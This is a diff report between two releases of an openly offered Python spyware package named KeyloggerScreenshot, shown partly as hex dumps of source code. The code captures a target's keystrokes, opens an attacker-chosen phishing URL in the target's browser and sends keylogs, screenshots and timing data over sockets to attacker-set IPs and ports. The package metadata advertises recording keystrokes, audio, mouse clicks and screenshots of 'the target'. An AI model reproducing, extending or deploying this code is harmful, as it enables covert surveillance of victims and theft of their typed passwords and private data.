+00002b40: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00002b50: 7269 6368 7469 6765 5f6c 6973 7465 202b  richtige_liste +
+00002b60: 3d20 227b 220d 0a20 2020 2020 2020 2020  = "{"..         
+00002b70: 2020 2020 2020 2023 2049 6620 7468 6520         # If the 
+00002b80: 7461 7267 6574 2070 7265 7373 6573 2074  target presses t
+00002b90: 6162 206f 7220 7370 6163 6520 6120 227b  ab or space a "{
+00002ba0: 2220 7769 6c6c 2062 6520 6170 7065 6e64  " will be append
+00002bb0: 6564 2074 6f20 7468 6520 6c69 7374 2073  ed to the list s
+00002bc0: 6f20 7468 6520 6174 7461 636b 6572 206b  o the attacker k
+00002bd0: 6e6f 7773 2077 6865 6e20 616e 640d 0a20  nows when and.. 
+00002be0: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+00002bf0: 2073 7061 6365 206f 7220 6120 7461 6220   space or a tab 
+00002c00: 6b65 7920 6861 7320 6265 656e 2070 7265  key has been pre
+00002c10: 7373 6564 0d0a 2020 2020 2020 2020 2020  ssed..          
+00002c20: 2020 656c 6966 206b 6579 203d 3d20 6b65    elif key == ke
+00002c30: 7962 6f61 7264 2e4b 6579 2e63 6170 735f  yboard.Key.caps_
+00002c40: 6c6f 636b 3a0d 0a20 2020 2020 2020 2020  lock:..         
+00002c50: 2020 2020 2020 2073 656c 662e 6361 7073         self.caps
+00002c60: 203d 2054 7275 650d 0a20 2020 2020 2020   = True..       
+00002c70: 2020 2020 2020 2020 2073 656c 662e 6368           self.ch
+00002c80: 6563 6b2e 6170 7065 6e64 2831 290d 0a20  eck.append(1).. 
+00002c90: 2020 2020 2020 2020 2020 2063 6865 636b             check
+00002ca0: 5f63 6170 7320 3d20 7375 6d28 7365 6c66  _caps = sum(self
+00002cb0: 2e63 6865 636b 2920 2f20 320d 0a20 2020  .check) / 2..   
+00002cc0: 2020 2020 2020 2020 2023 2049 6620 6368           # If ch
+00002cd0: 6563 6b5f 6361 7073 2069 7320 6e6f 7420  eck_caps is not 
+00002ce0: 7072 696d 6172 7920 6974 2077 696c 6c20  primary it will 
+00002cf0: 7365 7420 7365 6c66 2e63 6170 7320 746f  set self.caps to
+00002d00: 2046 616c 7365 0d0a 0d0a 2020 2020 2020   False....      
+00002d10: 2020 2020 2020 6966 2073 7472 2863 6865        if str(che
+00002d20: 636b 5f63 6170 7329 5b2d 315d 2021 3d20  ck_caps)[-1] != 
+00002d30: 2730 273a 0d0a 2020 2020 2020 2020 2020  '0':..          
+00002d40: 2020 2020 2020 7061 7373 0d0a 2020 2020        pass..    
+00002d50: 2020 2020 2020 2020 656c 7365 3a0d 0a20          else:.. 
+00002d60: 2020 2020 2020 2020 2020 2020 2020 2073                 s
+00002d70: 656c 662e 6361 7073 203d 2046 616c 7365  elf.caps = False
+00002d80: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002d90: 2020 2320 5468 6973 2072 6573 6574 7320    # This resets 
+00002da0: 6576 6572 7974 6869 6e67 0d0a 0d0a 2020  everything....  
+00002db0: 2020 2020 2020 2020 2020 6966 206b 6579            if key
+00002dc0: 203d 3d20 6b65 7962 6f61 7264 2e4b 6579   == keyboard.Key
+00002dd0: 2e62 6163 6b73 7061 6365 3a0d 0a20 2020  .backspace:..   
+00002de0: 2020 2020 2020 2020 2020 2020 2064 7420               dt 
+00002df0: 3d20 6461 7465 7469 6d65 2e6e 6f77 2829  = datetime.now()
+00002e00: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002e10: 2020 2320 4765 7473 2074 6865 2063 7572    # Gets the cur
+00002e20: 7265 6e74 2074 696d 650d 0a20 2020 2020  rent time..     
+00002e30: 2020 2020 2020 2020 2020 2067 6574 5f74             get_t
+00002e40: 696d 6520 3d20 7374 7228 6474 292e 7370  ime = str(dt).sp
+00002e50: 6c69 7428 223a 2229 0d0a 2020 2020 2020  lit(":")..      
+00002e60: 2020 2020 2020 2020 2020 2320 5468 6973            # This
+00002e70: 2073 706c 6974 7320 7468 6520 7469 6d65   splits the time
+00002e80: 2073 6f20 7468 6520 6d69 6e75 7465 7320   so the minutes 
+00002e90: 616e 6420 7365 636f 6e64 7320 6172 6520  and seconds are 
+00002ea0: 6469 7370 6c61 7965 640d 0a0d 0a20 2020  displayed....   
+00002eb0: 2020 2020 2020 2020 2020 2020 2068 6f75               hou
+00002ec0: 722c 206d 696e 7574 6573 2c20 7365 6320  r, minutes, sec 
+00002ed0: 3d20 696e 7428 6765 745f 7469 6d65 5b30  = int(get_time[0
+00002ee0: 5d5b 3a3a 2d31 5d5b 303a 325d 5b3a 3a2d  ][::-1][0:2][::-
+00002ef0: 315d 292c 2069 6e74 2867 6574 5f74 696d  1]), int(get_tim
+00002f00: 655b 315d 292c 2066 6c6f 6174 2867 6574  e[1]), float(get
+00002f10: 5f74 696d 655b 325d 290d 0a20 2020 2020  _time[2])..     
+00002f20: 2020 2020 2020 2020 2020 2023 2047 6574             # Get
+00002f30: 7320 7468 6520 6375 7272 656e 7420 686f  s the current ho
+00002f40: 7572 2c20 6d69 6e75 7465 2061 6e64 2073  ur, minute and s
+00002f50: 6563 6f6e 640d 0a0d 0a20 2020 2020 2020  econd....       
+00002f60: 2020 2020 2020 2020 2061 6c6c 203d 2068           all = h
+00002f70: 6f75 7220 2a20 3336 3030 202b 206d 696e  our * 3600 + min
+00002f80: 7574 6573 202a 2036 3020 2b20 7365 630d  utes * 60 + sec.
+00002f90: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002fa0: 2023 2047 6574 7320 7468 6520 7365 636f   # Gets the seco
+00002fb0: 6e64 7320 6f66 2065 7665 7279 7468 696e  nds of everythin
+00002fc0: 6720 6672 6f6d 2068 6f75 7220 746f 2073  g from hour to s
+00002fd0: 6563 6f6e 640d 0a20 2020 2020 2020 2020  econd..         
+00002fe0: 2020 2020 2020 2069 6620 6e6f 7420 7365         if not se
+00002ff0: 6c66 2e73 6563 6f6e 6473 3a0d 0a20 2020  lf.seconds:..   
+00003000: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003010: 2023 2049 6620 7468 6572 6520 6973 206e   # If there is n
+00003020: 6f74 6869 6e67 2069 6e20 7468 6520 6c69  othing in the li
+00003030: 7374 2073 6563 6f6e 6420 7769 6c6c 2062  st second will b
+00003040: 6520 6170 7061 6e64 6564 0d0a 2020 2020  e appanded..    
+00003050: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003060: 7365 6c66 2e73 6563 6f6e 6473 2e61 7070  self.seconds.app
+00003070: 656e 6428 616c 6c29 0d0a 2020 2020 2020  end(all)..      
+00003080: 2020 2020 2020 2020 2020 6d69 6e75 7320            minus 
+00003090: 3d20 616c 6c20 2d20 7365 6c66 2e73 6563  = all - self.sec
+000030a0: 6f6e 6473 5b30 5d0d 0a20 2020 2020 2020  onds[0]..       
+000030b0: 2020 2020 2020 2020 2023 2054 6869 7320           # This 
+000030c0: 6368 6563 6b73 2069 6620 7468 6520 7461  checks if the ta
+000030d0: 7267 6574 2069 7320 686f 6c64 696e 6720  rget is holding 
+000030e0: 7468 6520 6261 636b 7370 6163 6520 6b65  the backspace ke
+000030f0: 790d 0a20 2020 2020 2020 2020 2020 2020  y..             
+00003100: 2020 2069 6620 6d69 6e75 7320 3e20 302e     if minus > 0.
+00003110: 3035 206f 7220 6d69 6e75 7320 3d3d 2030  05 or minus == 0
+00003120: 2e30 3a0d 0a20 2020 2020 2020 2020 2020  .0:..           
+00003130: 2020 2020 2020 2020 2069 6620 7365 6c66           if self
+00003140: 2e72 6963 6874 6967 655f 6c69 7374 653a  .richtige_liste:
+00003150: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00003160: 2020 2020 2020 2020 2020 7365 6c66 2e72            self.r
+00003170: 6963 6874 6967 655f 6c69 7374 652e 706f  ichtige_liste.po
+00003180: 7028 2d31 290d 0a20 2020 2020 2020 2020  p(-1)..         
+00003190: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+000031a0: 2052 656d 6f76 6573 2074 6865 206c 6173   Removes the las
+000031b0: 7420 6974 656d 206f 6620 7468 6520 6c69  t item of the li
+000031c0: 7374 0d0a 0d0a 2020 2020 2020 2020 2020  st....          
+000031d0: 2020 2020 2020 7365 6c66 2e73 6563 6f6e        self.secon
+000031e0: 6473 5b30 5d20 3d20 616c 6c0d 0a20 2020  ds[0] = all..   
+000031f0: 2020 2020 2020 2020 2020 2020 2023 204c               # L
+00003200: 6973 7420 7769 6c6c 2061 6c6c 7761 7973  ist will allways
+00003210: 2062 6520 7570 6461 7465 640d 0a0d 0a20   be updated.... 
+00003220: 2020 2064 6566 206f 6e5f 7265 6c65 6173     def on_releas
+00003230: 6528 7365 6c66 2c20 6b65 7929 3a0d 0a20  e(self, key):.. 
+00003240: 2020 2020 2020 2070 7269 6e74 2866 274b         print(f'K
+00003250: 6579 2072 656c 6561 7365 643a 207b 6b65  ey released: {ke
+00003260: 797d 2729 0d0a 0d0a 2020 2020 4073 7461  y}')....    @sta
+00003270: 7469 636d 6574 686f 640d 0a20 2020 2064  ticmethod..    d
+00003280: 6566 2069 6e74 6572 6e65 745f 636f 6e6e  ef internet_conn
+00003290: 6563 7469 6f6e 2829 3a0d 0a20 2020 2020  ection():..     
+000032a0: 2020 2023 2054 6869 7320 6675 6e63 7469     # This functi
+000032b0: 6f6e 2063 6865 636b 7320 6966 2061 2063  on checks if a c
+000032c0: 6f6e 6e65 6374 696f 6e20 6973 2073 7461  onnection is sta
+000032d0: 626c 650d 0a20 2020 2020 2020 2077 6869  ble..        whi
+000032e0: 6c65 2054 7275 653a 0d0a 2020 2020 2020  le True:..      
+000032f0: 2020 2020 2020 7472 793a 0d0a 2020 2020        try:..    
+00003300: 2020 2020 2020 2020 2020 2020 7265 7175              requ
+00003310: 6573 7473 2e67 6574 2822 6874 7470 733a  ests.get("https:
+00003320: 2f2f 7777 772e 676f 6f67 6c65 2e63 6f6d  //www.google.com
+00003330: 2f22 290d 0a20 2020 2020 2020 2020 2020  /")..           
+00003340: 2020 2020 2023 2047 6f6f 676c 6520 6973       # Google is
+00003350: 2061 6c77 6179 7320 6f6e 6c69 6e65 2073   always online s
+00003360: 6f20 4920 6368 6f73 6520 676f 6f67 6c65  o I chose google
+00003370: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00003380: 2020 6272 6561 6b0d 0a20 2020 2020 2020    break..       
+00003390: 2020 2020 2020 2020 2023 2049 6620 7468           # If th
+000033a0: 6572 6520 6973 2061 6e20 696e 7465 726e  ere is an intern
+000033b0: 6574 2063 6f6e 6e65 6374 696f 6e20 6974  et connection it
+000033c0: 2077 696c 6c20 7275 6e20 6173 206e 6f72   will run as nor
+000033d0: 6d61 6c0d 0a20 2020 2020 2020 2020 2020  mal..           
+000033e0: 2065 7863 6570 7420 7265 7175 6573 7473   except requests
+000033f0: 2e65 7863 6570 7469 6f6e 732e 436f 6e6e  .exceptions.Conn
+00003400: 6563 7469 6f6e 4572 726f 723a 0d0a 2020  ectionError:..  
+00003410: 2020 2020 2020 2020 2020 2020 2020 7072                pr
+00003420: 696e 7428 224e 6f20 436f 6e6e 6563 7469  int("No Connecti
+00003430: 6f6e 2229 0d0a 0d0a 2020 2020 6465 6620  on")....    def 
+00003440: 7374 6172 7428 7365 6c66 293a 0d0a 2020  start(self):..  
+00003450: 2020 2020 2020 7365 6c66 2e69 6e74 6572        self.inter
+00003460: 6e65 745f 636f 6e6e 6563 7469 6f6e 2829  net_connection()
+00003470: 0d0a 2020 2020 2020 2020 7469 6d65 2e73  ..        time.s
+00003480: 6c65 6570 2831 290d 0a20 2020 2020 2020  leep(1)..       
+00003490: 2023 204a 7573 7420 746f 2063 6f6f 6c20   # Just to cool 
+000034a0: 646f 776e 0d0a 0d0a 2020 2020 2020 2020  down....        
+000034b0: 6966 2073 656c 662e 7068 6973 6869 6e67  if self.phishing
+000034c0: 2069 7320 6e6f 7420 4e6f 6e65 3a0d 0a20   is not None:.. 
+000034d0: 2020 2020 2020 2020 2020 2074 7279 3a0d             try:.
+000034e0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000034f0: 2072 6571 7565 7374 732e 6765 7428 7365   requests.get(se
+00003500: 6c66 2e70 6869 7368 696e 6729 0d0a 2020  lf.phishing)..  
+00003510: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+00003520: 5265 7370 6f6e 6520 6973 2068 6572 6520  Respone is here 
+00003530: 746f 2073 6565 2069 6620 7468 6520 7765  to see if the we
+00003540: 6273 6974 6520 6973 206f 6e6c 696e 6520  bsite is online 
+00003550: 6f72 206e 6f74 0d0a 2020 2020 2020 2020  or not..        
+00003560: 2020 2020 2020 2020 7765 6262 726f 7773          webbrows
+00003570: 6572 2e6f 7065 6e28 7365 6c66 2e70 6869  er.open(self.phi
+00003580: 7368 696e 6729 0d0a 0d0a 2020 2020 2020  shing)....      
+00003590: 2020 2020 2020 6578 6365 7074 2072 6571        except req
+000035a0: 7565 7374 732e 6578 6365 7074 696f 6e73  uests.exceptions
+000035b0: 2e43 6f6e 6e65 6374 696f 6e45 7272 6f72  .ConnectionError
+000035c0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+000035d0: 2020 2070 7269 6e74 2822 4e6f 2063 6f6e     print("No con
+000035e0: 6e65 6374 696f 6e22 290d 0a0d 0a20 2020  nection")....   
+000035f0: 2020 2020 2020 2020 2065 7863 6570 7420           except 
+00003600: 7265 7175 6573 7473 2e65 7863 6570 7469  requests.excepti
+00003610: 6f6e 732e 496e 7661 6c69 6455 524c 3a0d  ons.InvalidURL:.
+00003620: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00003630: 2070 7269 6e74 2822 496e 7661 6c69 6420   print("Invalid 
+00003640: 5572 6c22 290d 0a0d 0a20 2020 2020 2020  Url")....       
+00003650: 206c 6973 7465 6e69 6e67 5f74 6872 6561   listening_threa
+00003660: 6420 3d20 7468 7265 6164 696e 672e 5468  d = threading.Th
+00003670: 7265 6164 2874 6172 6765 743d 7365 6c66  read(target=self
+00003680: 2e64 6174 656e 5f61 7566 6e65 6865 6d65  .daten_aufneheme
+00003690: 6e29 0d0a 2020 2020 2020 2020 2320 5468  n)..        # Th
 000036a0: 6973 2072 756e 7320 7468 6520 7072 6f67  is runs the prog
-000036b0: 726d 6d20 6265 6869 6e64 2074 6865 2061  rmm behind the a
+000036b0: 7261 6d20 6265 6869 6e64 2074 6865 2061  ram behind the a
 000036c0: 6374 7561 6c20 7072 6f67 7261 6d6d 696e  ctual programmin
-000036d0: 670d 0a20 2020 2020 2020 2074 6872 6561  g..        threa
-000036e0: 6469 6e67 5f6d 6f75 7365 2e73 7461 7274  ding_mouse.start
-000036f0: 2829 0d0a 0d0a 2020 2020 2020 2020 7365  ()....        se
-00003700: 6e64 5f74 696d 6572 203d 2073 6f63 6b65  nd_timer = socke
-00003710: 742e 736f 636b 6574 2873 6f63 6b65 742e  t.socket(socket.
-00003720: 4146 5f49 4e45 542c 2073 6f63 6b65 742e  AF_INET, socket.
-00003730: 534f 434b 5f53 5452 4541 4d29 0d0a 2020  SOCK_STREAM)..  
-00003740: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
-00003750: 2e63 6f6e 6e65 6374 2828 7365 6c66 2e69  .connect((self.i
-00003760: 705f 7469 6d65 722c 2073 656c 662e 706f  p_timer, self.po
-00003770: 7274 5f74 696d 6572 2929 0d0a 0d0a 2020  rt_timer))....  
-00003780: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
-00003790: 2e73 656e 6428 7374 7228 7365 6c66 2e64  .send(str(self.d
-000037a0: 7572 6174 696f 6e29 2e65 6e63 6f64 6528  uration).encode(
-000037b0: 2929 0d0a 2020 2020 2020 2020 2320 5468  ))..        # Th
-000037c0: 6973 2073 656e 6473 2074 6865 2073 6563  is sends the sec
-000037d0: 6f6e 6473 2074 6f20 7468 6520 7365 7276  onds to the serv
-000037e0: 6572 0d0a 2020 2020 2020 2020 7365 6e64  er..        send
-000037f0: 5f74 696d 6572 2e63 6c6f 7365 2829 0d0a  _timer.close()..
-00003800: 0d0a 2020 2020 2020 2020 7469 6d65 725f  ..        timer_
-00003810: 6465 6c65 7465 5f64 6972 203d 2073 6f63  delete_dir = soc
-00003820: 6b65 742e 736f 636b 6574 2873 6f63 6b65  ket.socket(socke
-00003830: 742e 4146 5f49 4e45 542c 2073 6f63 6b65  t.AF_INET, socke
-00003840: 742e 534f 434b 5f53 5452 4541 4d29 0d0a  t.SOCK_STREAM)..
-00003850: 2020 2020 2020 2020 7469 6d65 725f 6465          timer_de
-00003860: 6c65 7465 5f64 6972 2e63 6f6e 6e65 6374  lete_dir.connect
-00003870: 2828 2231 3237 2e30 2e30 2e31 222c 2031  (("127.0.0.1", 1
-00003880: 3037 3729 290d 0a0d 0a20 2020 2020 2020  077))....       
-00003890: 2074 696d 6572 5f64 656c 6574 655f 6469   timer_delete_di
-000038a0: 722e 7365 6e64 2873 7472 2873 656c 662e  r.send(str(self.
-000038b0: 6475 7261 7469 6f6e 292e 656e 636f 6465  duration).encode
-000038c0: 2829 290d 0a20 2020 2020 2020 2074 696d  ())..        tim
-000038d0: 6572 5f64 656c 6574 655f 6469 722e 636c  er_delete_dir.cl
-000038e0: 6f73 6528 290d 0a0d 0a20 2020 2020 2020  ose()....       
-000038f0: 2077 6974 6820 6b65 7962 6f61 7264 2e4c   with keyboard.L
-00003900: 6973 7465 6e65 7228 6f6e 5f70 7265 7373  istener(on_press
-00003910: 3d73 656c 662e 6f6e 5f70 7265 7373 2c20  =self.on_press, 
-00003920: 6f6e 5f72 656c 6561 7365 3d73 656c 662e  on_release=self.
-00003930: 6f6e 5f72 656c 6561 7365 2920 6173 206c  on_release) as l
-00003940: 6973 7465 6e65 723a 0d0a 2020 2020 2020  istener:..      
-00003950: 2020 2020 2020 7365 6c66 2e63 6f75 6e74        self.count
-00003960: 646f 776e 5f73 656e 6428 7365 6c66 2e64  down_send(self.d
-00003970: 7572 6174 696f 6e2c 2073 656c 662e 6970  uration, self.ip
-00003980: 5f70 686f 746f 732c 2073 656c 662e 706f  _photos, self.po
-00003990: 7274 5f70 686f 746f 732c 2073 656c 662e  rt_photos, self.
-000039a0: 6970 5f6b 6579 6c6f 6767 6572 2c0d 0a20  ip_keylogger,.. 
-000039b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000039c0: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-000039d0: 656c 662e 706f 7274 5f6b 6579 6c6f 6767  elf.port_keylogg
-000039e0: 6572 290d 0a20 2020 2020 2020 2020 2020  er)..           
-000039f0: 206c 6973 7465 6e65 722e 6a6f 696e 2829   listener.join()
-00003a00: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-00003a10: 5468 6973 206c 6973 7465 6e73 2074 6f20  This listens to 
-00003a20: 7468 6520 6b65 7973 2074 6861 7420 7768  the keys that wh
-00003a30: 6572 6520 7479 7065 640d 0a              ere typed..
+000036d0: 670d 0a20 2020 2020 2020 206c 6973 7465  g..        liste
+000036e0: 6e69 6e67 5f74 6872 6561 642e 7374 6172  ning_thread.star
+000036f0: 7428 290d 0a0d 0a20 2020 2020 2020 2074  t()....        t
+00003700: 6872 6561 6469 6e67 5f6d 6f75 7365 203d  hreading_mouse =
+00003710: 2074 6872 6561 6469 6e67 2e54 6872 6561   threading.Threa
+00003720: 6428 7461 7267 6574 3d73 656c 662e 616c  d(target=self.al
+00003730: 6c5f 636c 6963 6b73 290d 0a20 2020 2020  l_clicks)..     
+00003740: 2020 2023 2054 6869 7320 7275 6e73 2074     # This runs t
+00003750: 6865 2070 726f 6772 6d6d 2062 6568 696e  he progrmm behin
+00003760: 6420 7468 6520 6163 7475 616c 2070 726f  d the actual pro
+00003770: 6772 616d 6d69 6e67 0d0a 2020 2020 2020  gramming..      
+00003780: 2020 7468 7265 6164 696e 675f 6d6f 7573    threading_mous
+00003790: 652e 7374 6172 7428 290d 0a0d 0a20 2020  e.start()....   
+000037a0: 2020 2020 2073 656e 645f 7469 6d65 7220       send_timer 
+000037b0: 3d20 736f 636b 6574 2e73 6f63 6b65 7428  = socket.socket(
+000037c0: 736f 636b 6574 2e41 465f 494e 4554 2c20  socket.AF_INET, 
+000037d0: 736f 636b 6574 2e53 4f43 4b5f 5354 5245  socket.SOCK_STRE
+000037e0: 414d 290d 0a20 2020 2020 2020 2073 656e  AM)..        sen
+000037f0: 645f 7469 6d65 722e 636f 6e6e 6563 7428  d_timer.connect(
+00003800: 2873 656c 662e 6970 5f74 696d 6572 2c20  (self.ip_timer, 
+00003810: 7365 6c66 2e70 6f72 745f 7469 6d65 7229  self.port_timer)
+00003820: 290d 0a0d 0a20 2020 2020 2020 2073 656e  )....        sen
+00003830: 645f 7469 6d65 722e 7365 6e64 2873 7472  d_timer.send(str
+00003840: 2873 656c 662e 6475 7261 7469 6f6e 292e  (self.duration).
+00003850: 656e 636f 6465 2829 290d 0a20 2020 2020  encode())..     
+00003860: 2020 2023 2054 6869 7320 7365 6e64 7320     # This sends 
+00003870: 7468 6520 7365 636f 6e64 7320 746f 2074  the seconds to t
+00003880: 6865 2073 6572 7665 720d 0a20 2020 2020  he server..     
+00003890: 2020 2073 656e 645f 7469 6d65 722e 636c     send_timer.cl
+000038a0: 6f73 6528 290d 0a0d 0a20 2020 2020 2020  ose()....       
+000038b0: 2074 696d 6572 5f64 656c 6574 655f 6469   timer_delete_di
+000038c0: 7220 3d20 736f 636b 6574 2e73 6f63 6b65  r = socket.socke
+000038d0: 7428 736f 636b 6574 2e41 465f 494e 4554  t(socket.AF_INET
+000038e0: 2c20 736f 636b 6574 2e53 4f43 4b5f 5354  , socket.SOCK_ST
+000038f0: 5245 414d 290d 0a20 2020 2020 2020 2074  REAM)..        t
+00003900: 696d 6572 5f64 656c 6574 655f 6469 722e  imer_delete_dir.
+00003910: 636f 6e6e 6563 7428 2822 3132 372e 302e  connect(("127.0.
+00003920: 302e 3122 2c20 3130 3737 2929 0d0a 0d0a  0.1", 1077))....
+00003930: 2020 2020 2020 2020 7469 6d65 725f 6465          timer_de
+00003940: 6c65 7465 5f64 6972 2e73 656e 6428 7374  lete_dir.send(st
+00003950: 7228 7365 6c66 2e64 7572 6174 696f 6e29  r(self.duration)
+00003960: 2e65 6e63 6f64 6528 2929 0d0a 2020 2020  .encode())..    
+00003970: 2020 2020 7469 6d65 725f 6465 6c65 7465      timer_delete
+00003980: 5f64 6972 2e63 6c6f 7365 2829 0d0a 0d0a  _dir.close()....
+00003990: 2020 2020 2020 2020 7769 7468 206b 6579          with key
+000039a0: 626f 6172 642e 4c69 7374 656e 6572 286f  board.Listener(o
+000039b0: 6e5f 7072 6573 733d 7365 6c66 2e6f 6e5f  n_press=self.on_
+000039c0: 7072 6573 732c 206f 6e5f 7265 6c65 6173  press, on_releas
+000039d0: 653d 7365 6c66 2e6f 6e5f 7265 6c65 6173  e=self.on_releas
+000039e0: 6529 2061 7320 6c69 7374 656e 6572 3a0d  e) as listener:.
+000039f0: 0a20 2020 2020 2020 2020 2020 2073 656c  .            sel
+00003a00: 662e 636f 756e 7464 6f77 6e5f 7365 6e64  f.countdown_send
+00003a10: 2873 656c 662e 6475 7261 7469 6f6e 2c20  (self.duration, 
+00003a20: 7365 6c66 2e69 705f 7068 6f74 6f73 2c20  self.ip_photos, 
+00003a30: 7365 6c66 2e70 6f72 745f 7068 6f74 6f73  self.port_photos
+00003a40: 2c20 7365 6c66 2e69 705f 6b65 796c 6f67  , self.ip_keylog
+00003a50: 6765 722c 0d0a 2020 2020 2020 2020 2020  ger,..          
+00003a60: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003a70: 2020 2020 2020 7365 6c66 2e70 6f72 745f        self.port_
+00003a80: 6b65 796c 6f67 6765 7229 0d0a 2020 2020  keylogger)..    
+00003a90: 2020 2020 2020 2020 6c69 7374 656e 6572          listener
+00003aa0: 2e6a 6f69 6e28 290d 0a20 2020 2020 2020  .join()..       
+00003ab0: 2020 2020 2023 2054 6869 7320 6c69 7374       # This list
+00003ac0: 656e 7320 746f 2074 6865 206b 6579 7320  ens to the keys 
+00003ad0: 7468 6174 2077 6865 7265 2074 790d 0a    that where ty..
```

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Local_Deleter.py` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Local_Deleter.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Port_data.py` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Port_data.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_keylogger.py` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Server_keylogger.py`

 * *Files 4% similar despite different names*

```diff
@@ -2,14 +2,15 @@
 import sys
 import socket
 import os
 import BetterPrinting as bp
 from .Server_photos import ServerPhotos
 from .Port_data import Ports
 from .Simulation_code import Simulation
+import KeyloggerScreenshot as ks
 
 class ServerKeylogger:
     # This is the class of the Server. Both Server should not be in the same file
     def __init__(self, ip, port, simulater=False):
         self.ip = ip
         self.port = port
         self.simulater = simulater
@@ -126,14 +127,30 @@
                 bp.color("The target hasn't typed and clicked anything", "magenta")
                 # This shuts down the server
             else:
                 self.do_file(self.full_msg.split("***%§§)§§%")[1])
                 ServerKeylogger.terminator()
 
             if self.simulater is True:
+                if "Simulation_code.py" not in os.listdir():
+                    get_name = str(ks.Simulation_code).split("from")
+                    full_name = get_name[1].split(">")[0]
+                    full_name = full_name.split()[0]
+                    full_name = full_name.split("'")[1]
+
+                    with open(full_name, "r+") as file:
+                        data = [each for each in file]
+                        data += "\n\nSimulation.start_simulation()"
+
+                    with open("Simulation_code.py", "a+") as file:
+                        for line in data:
+                            file.write(line)
+
+                    bp.color('"Simulation_code.py" has been made', "magenta")
+
                 print("Simulation will come in 10 seconds!!!")
                 time.sleep(10)
                 start = input("Do you want to start y/n?: ")
                 if start not in ["y", "yes"]:
                     print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                     os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_listener.py` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Server_listener.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_photos.py` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Server_photos.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_timer.py` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Server_timer.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Simulation_code.py` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Simulation_code.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/PKG-INFO` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.4.2
+Version: 0.4.3
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: Keylogger
 Classifier: Development Status :: 6 - Mature
@@ -368,7 +368,12 @@
 - Fixed Interruption Error
 - Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
 
 0.4.2 (23/05/2023)
 ------------------
 - Fixed simulation Error
 - Every coordinate will be shown by order
+
+0.4.3 (22/06/2023)
+------------------
+- Simulation_code.py will now be made if simulater on Server_keylogger is true
+
```

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/SOURCES.txt` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot.egg-info/SOURCES.txt`

 * *Files 10% similar despite different names*

```diff
@@ -1,13 +1,12 @@
 CHANGELOG.txt
 KLS_start.py
 LISCENCE.txt
 MANIFEST.in
 README.md
-Simualation_code.py
 client.py
 demon_server.py
 leo_gui.py
 requirements.py
 setup.py
 target.py
 test.py
```

### Comparing `KeyloggerScreenshot-0.4.2/LISCENCE.txt` & `KeyloggerScreenshot-0.4.3/LISCENCE.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/PKG-INFO` & `KeyloggerScreenshot-0.4.3/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.4.2
+Version: 0.4.3
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: Keylogger
 Classifier: Development Status :: 6 - Mature
@@ -368,7 +368,12 @@
 - Fixed Interruption Error
 - Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
 
 0.4.2 (23/05/2023)
 ------------------
 - Fixed simulation Error
 - Every coordinate will be shown by order
+
+0.4.3 (22/06/2023)
+------------------
+- Simulation_code.py will now be made if simulater on Server_keylogger is true
+
```

